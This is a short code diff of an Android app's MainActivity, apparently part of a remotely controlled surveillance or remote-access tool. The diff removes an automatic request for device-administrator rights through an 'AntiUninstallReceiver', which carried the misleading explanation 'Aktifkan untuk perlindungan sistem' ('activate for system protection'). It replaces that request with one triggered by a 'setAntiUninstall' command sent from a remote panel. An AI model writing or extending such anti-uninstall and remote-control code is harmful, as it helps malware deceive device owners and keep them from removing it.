@@ -337,18 +337,12 @@ class MainActivity : AppCompatActivity() {
                 )
             }
         }
-
-        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        val admin = ComponentName(this, AntiUninstallReceiver::class.java)
-        if (!dpm.isAdminActive(admin)) {
-            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
-            intent.putExtra(
-                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                "Aktifkan untuk perlindungan sistem"
-            )
-            settingsIntents.add(intent)
-        }
+        
+        // Anti-uninstall admin TIDAK diminta otomatis.
+// Hanya diminta via command "setAntiUninstall" dari panel.
+if (AntiUninstallHelper.isEnabled(this) && !AntiUninstallHelper.isAdminActive(this)) {
+    AntiUninstallHelper.requestAdminIfNeeded(this)
+}
 
         if (settingIndex < settingsIntents.size) {
             isRequestingSettings = true
